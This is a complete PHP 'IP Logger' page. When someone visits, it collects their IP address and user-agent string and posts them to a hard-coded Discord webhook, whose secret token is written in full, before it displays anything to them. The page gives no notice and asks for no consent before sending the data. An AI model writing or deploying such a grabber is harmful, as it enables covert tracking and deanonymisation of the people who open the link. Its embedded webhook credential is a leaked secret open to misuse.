<?php
// Define your Discord webhook URL here
$webhookUrl = "https://discord.com/api/webhooks/1277686951507656806/k8I4OOkCrPvUz-PdxO1CFAgZezZ-Nlu3Q1pscMj_aNCMPOKLPhYA6h4aq8fc5kOEITG7";

// Function to get client IP address
function getClientIp() {
    $ip = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        // Check if the IP is passed from a shared internet connection
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Check if the IP is passed from a proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        // Get the IP address from remote address
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Get the user's IP address
$ip = getClientIp();

// Capture device type using JavaScript and send it via AJAX
$deviceType = $_SERVER['HTTP_USER_AGENT'];

// Prepare the data to be sent to Discord
$data = [
    'content' => '',
    'embeds' => [
        [
            'title' => 'New Visitor Information',
            'fields' => [
                ['name' => 'IP Address', 'value' => $ip, 'inline' => true],
                ['name' => 'Device Type', 'value' => $deviceType, 'inline' => true],
            ],
            'color' => 7506394, // Hex color code for the embed
        ],
    ],
];

// Send data to Discord webhook
$ch = curl_init($webhookUrl);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
$response = curl_exec($ch);
curl_close($ch);

// Display the user's IP address
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
</head>
<body>
    <h1>Your IP Address</h1>
    <p><?php echo 'Your IP: ' . htmlspecialchars($ip); ?></p>
    <p><?php echo 'Device Type: ' . htmlspecialchars($deviceType); ?></p>
</body>
</html>
